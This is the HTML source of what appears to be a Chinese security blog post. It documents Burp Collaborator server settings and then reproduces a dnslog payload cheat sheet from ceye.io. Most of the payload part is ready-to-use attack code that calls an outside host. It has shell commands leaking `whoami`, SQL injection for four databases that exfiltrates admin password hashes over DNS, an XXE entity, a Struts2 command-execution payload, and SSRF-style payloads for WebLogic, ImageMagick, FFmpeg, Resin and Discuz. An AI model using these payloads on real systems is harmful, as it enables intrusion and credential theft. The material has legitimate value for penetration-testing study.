&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;publicAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;10.20.0.159&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;http &amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;port&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;9090&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;https&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;port&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;9443&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ssl&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;hostname&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;collaboratorpolling.example.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;metrics&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;path&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;jnaicmez8&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;addressWhitelist&amp;#34;&lt;/span&gt;: [&lt;span style="color:#e6db74"&gt;&amp;#34;21.10.23.0/24&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;dns&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;interfaces&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;ns1&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;localAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;34.23.11.6&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;publicAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;98.87.76.55&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;ns2&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;localAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;34.23 .11.6&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;publicAddress&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;98.87.11.00&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ],
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;ports&amp;#34;&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;53&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; },
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;#34;logLevel&amp;#34;&lt;/span&gt;: &lt;span style="color:#e6db74"&gt;&amp;#34;INFO&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;SERVERDOMAIN&lt;/th&gt;
&lt;th&gt;Collaborator 服务器将控制 DNS 的域或子域。DNS 功能需要此设置。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;workerThreads&lt;/td&gt;
&lt;td&gt;Collaborator 用于处理传入请求的线程数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.localAddress&lt;/td&gt;
&lt;td&gt;默认情况下，Collaborator 将侦听所有本地接口以捕获交互事件。如果指定，它将仅侦听已配置的接口。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.publicAddress&lt;/td&gt;
&lt;td&gt;用于捕获交互事件的公共 IP 地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.http.ports&lt;/td&gt;
&lt;td&gt;用于侦听 HTTP 交互事件的端口。如果正在转发端口 80，则只应从默认值更改。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.https.ports&lt;/td&gt;
&lt;td&gt;用于侦听 HTTPS 交互事件的端口。如果正在转发端口 443，则只应从默认值更改。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.smtp.ports&lt;/td&gt;
&lt;td&gt;用于侦听 SMTP 交互事件的端口。如果正在转发端口 25 和 587，则只应从默认值更改。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.smtps.ports&lt;/td&gt;
&lt;td&gt;用于侦听 SMTPS 交互事件的端口。如果正在转发端口 465，则只应从默认值更改。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;eventCapture.https.hostname&lt;/td&gt;
&lt;td&gt;用于生成自签名证书。有关详细信息，请参阅&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#ssl-configuration" target="_blank" rel="noopener"
&gt;SSL 配置&lt;/a&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;polling.localAddress&lt;/td&gt;
&lt;td&gt;默认情况下，Collaborator 将使用相同的网络接口捕获交互事件和提供轮询请求。如果指定，它将使用不同的接口来轮询请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;polling.publicAddress&lt;/td&gt;
&lt;td&gt;用于提供轮询请求的公共地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;polling.http.port&lt;/td&gt;
&lt;td&gt;用于通过 HTTP 轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
&gt;配置&lt;/a&gt; Burp Suite 才能使用它。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;polling.https.port&lt;/td&gt;
&lt;td&gt;用于通过 HTTPS 轮询的端口。这可能是非标准的，需要&lt;a class="link" href="https://portswigger.net/burp/documentation/desktop/options/misc-project#burp-collaborator-server" target="_blank" rel="noopener"
&gt;配置&lt;/a&gt; Burp Suite 才能使用它。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;polling.https.hostname&lt;/td&gt;
&lt;td&gt;用于生成自签名证书。有关详细信息，请参阅&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#ssl-configuration" target="_blank" rel="noopener"
&gt;SSL 配置&lt;/a&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;metrics.path&lt;/td&gt;
&lt;td&gt;可以访问度量标准页面的 URL 路径。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;metrics.whitelist&lt;/td&gt;
&lt;td&gt;允许访问指标页面的客户端 IP 地址白名单。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dns.ports&lt;/td&gt;
&lt;td&gt;用于侦听 DNS 查询的端口。如果正在转发端口 53，则只应从默认值更改。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dns.interfaces&lt;/td&gt;
&lt;td&gt;用于侦听 DNS 查询的本地接口列表。如果您的注册商要求您为每个权威名称服务器配置不同的 IP 地址，则可以使用多个网络接口并使用此选项配置其位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dns.interfaces.name&lt;/td&gt;
&lt;td&gt;用于在此接口上运行的名称服务器的主机名。每个名称服务器应使用不同的主机名（例如 ns1，ns2 等）。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dns.interfaces.localAddress&lt;/td&gt;
&lt;td&gt;要绑定到此名称服务器的本地地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dns.interfaces.publicAddress&lt;/td&gt;
&lt;td&gt;与配置的本地地址对应的公共 IP 地址。通常，您需要在域的 DNS 记录中使用配置的主机名和公共 IP 地址。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;LOGLEVEL&lt;/td&gt;
&lt;td&gt;标准输出所需 的&lt;a class="link" href="https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-logging" target="_blank" rel="noopener"
&gt;日志记录&lt;/a&gt;级别。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id="0x03-dnslog-的更多骚操作"&gt;0x03 dnslog 的更多骚操作
&lt;/h2&gt;&lt;p&gt;以下内容来自 dnslog 开放平台&lt;a class="link" href="http://ceye.io/payloads" target="_blank" rel="noopener"
&gt;&lt;strong&gt;ceye.io&lt;/strong&gt;&lt;/a&gt;。&lt;/p&gt;
&lt;h4 id="0x00-command-execution"&gt;0x00 Command Execution
&lt;/h4&gt;&lt;h5 id="i-nix"&gt;i. *nix:
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl http://ip.port.b182oj.ceye.io/&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;whoami&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ping &lt;span style="color:#e6db74"&gt;`&lt;/span&gt;whoami&lt;span style="color:#e6db74"&gt;`&lt;/span&gt;.ip.port.b182oj.ceye.io
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="ii-windows"&gt;ii. windows
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ping %USERNAME%.b182oj.ceye.io
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="0x01-sql-injection"&gt;0x01 SQL Injection
&lt;/h4&gt;&lt;h5 id="i-sql-server"&gt;i. SQL Server
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;DECLARE&lt;/span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;host&lt;/span&gt; varchar(&lt;span style="color:#ae81ff"&gt;1024&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;host&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; TOP &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;master.dbo.fn_varbintohexstr(password_hash)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; sys.sql_logins &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; name&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;sa&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.ip.port.b182oj.ceye.io&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;EXEC&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;master..xp_dirtree
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;\\&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;+@&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;host&lt;/span&gt;&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;\foobar$&amp;#34;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="ii-oracle"&gt;ii. Oracle
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; UTL_INADDR.GET_HOST_ADDRESS(&lt;span style="color:#e6db74"&gt;&amp;#39;ip.port.b182oj.ceye.io&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; UTL_HTTP.REQUEST(&lt;span style="color:#e6db74"&gt;&amp;#39;http://ip.port.b182oj.ceye.io/oracle&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; DUAL;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; HTTPURITYPE(&lt;span style="color:#e6db74"&gt;&amp;#39;http://ip.port.b182oj.ceye.io/oracle&amp;#39;&lt;/span&gt;).GETCLOB() &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; DUAL;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; DBMS_LDAP.INIT((&lt;span style="color:#e6db74"&gt;&amp;#39;oracle.ip.port.b182oj.ceye.io&amp;#39;&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; DUAL;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; DBMS_LDAP.INIT((&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; password &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; SYS.&lt;span style="color:#66d9ef"&gt;USER&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;$&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; name&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;SYS&amp;#39;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;||&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.ip.port.b182oj.ceye.io&amp;#39;&lt;/span&gt;,&lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; DUAL;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="iii-mysql"&gt;iii. MySQL
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; LOAD_FILE(CONCAT(&lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;,(&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; password &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; mysql.&lt;span style="color:#66d9ef"&gt;user&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;user&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;LIMIT&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;),&lt;span style="color:#e6db74"&gt;&amp;#39;.mysql.ip.port.b182oj.ceye.io\\abc&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="iv-postgresql"&gt;iv. PostgreSQL
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;DROP&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TABLE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;IF&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;EXISTS&lt;/span&gt; table_output;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;CREATE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TABLE&lt;/span&gt; table_output(content text);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;CREATE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;OR&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;REPLACE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FUNCTION&lt;/span&gt; temp_function()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;RETURNS&lt;/span&gt; VOID &lt;span style="color:#66d9ef"&gt;AS&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;$&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;DECLARE&lt;/span&gt; exec_cmd TEXT;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;DECLARE&lt;/span&gt; query_result TEXT;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;BEGIN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;INTO&lt;/span&gt; query_result (&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; passwd
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; pg_shadow &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt; usename&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;postgres&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;exec_cmd :&lt;span style="color:#f92672"&gt;=&lt;/span&gt; E&lt;span style="color:#e6db74"&gt;&amp;#39;COPY table_output(content)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;FROM E\&amp;#39;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;\\\\\\\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;||query_result||E&amp;#39;&lt;/span&gt;.psql.ip.port.b182oj.ceye.io&lt;span style="color:#960050;background-color:#1e0010"&gt;\\\\&lt;/span&gt;foobar.txt&lt;span style="color:#960050;background-color:#1e0010"&gt;\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;EXECUTE&lt;/span&gt; exec_cmd;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;END&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;$&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;LANGUAGE&lt;/span&gt; plpgsql &lt;span style="color:#66d9ef"&gt;SECURITY&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;DEFINER&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; temp_function();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="0x02-xml-entity-injection"&gt;0x02 XML Entity Injection
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-XML" data-lang="XML"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!DOCTYPE root [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;#34;http://ip.port.b182oj.ceye.io/xxe_test&amp;#34;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;%remote;]&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;root/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="0x03-others"&gt;0x03 Others
&lt;/h4&gt;&lt;h5 id="i-struts2"&gt;i. Struts2
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;xx.action?redirect:http://ip.port.b182oj.ceye.io/%25{3*4}
xx.action?redirect:${ %23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{&amp;#39;whoami&amp;#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&amp;#34;http://ip.port.b182oj.ceye.io/result%3d&amp;#34;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&amp;#34;GET&amp;#34;),%23http.connect(),%23http.getInputStream()}
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="ii-ffmpeg"&gt;ii. FFMpeg
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://ip.port.b182oj.ceye.io
#EXT-X-ENDLIST
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="iii-weblogic"&gt;iii. Weblogic
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt; xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Businesslocation&amp;amp;btnSubmit=Search
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="iv-imagemagick"&gt;iv. ImageMagick
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;push graphic-context
viewbox 0 0 640 480
fill &amp;#39;url(http://ip.port.b182oj.ceye.io)&amp;#39;
pop graphic-context
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="v-resin"&gt;v. Resin
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id="vi-discuz"&gt;vi. Discuz
&lt;/h5&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;http://xxx.xxxx.com/forum.php?mod=ajax&amp;amp;action=downremoteimg&amp;amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;amp;formhash=xxoo
